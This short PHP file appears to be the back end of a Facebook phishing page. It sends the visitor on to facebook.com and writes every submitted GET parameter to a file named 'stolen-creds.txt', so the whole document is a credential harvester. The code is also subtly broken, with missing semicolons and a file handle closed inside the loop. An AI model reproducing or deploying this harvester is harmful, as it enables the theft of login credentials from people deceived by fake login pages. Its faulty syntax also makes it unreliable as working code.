<?php
	header ("Location: http://facebook.com ");
	$handle = fopen("stolen-creds.txt", "a")
	foreach($_GET as $variable => $value) {
		fwrite($handle, "$variable=$value\n");
		fclose($handle);
	}
	fclose($handle)
?>

